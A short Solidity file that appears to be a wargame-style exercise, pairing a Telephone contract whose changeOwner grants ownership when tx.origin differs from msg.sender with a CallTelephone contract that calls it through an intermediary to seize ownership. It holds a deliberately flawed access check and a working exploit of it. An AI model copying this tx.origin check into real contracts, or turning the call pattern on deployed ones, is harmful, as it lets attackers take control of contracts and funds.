// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract CallTelephone {
    function callChangeOwner(address _telephoneAddress, address _owner) public {
        Telephone(_telephoneAddress).changeOwner(_owner);
    }
}

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

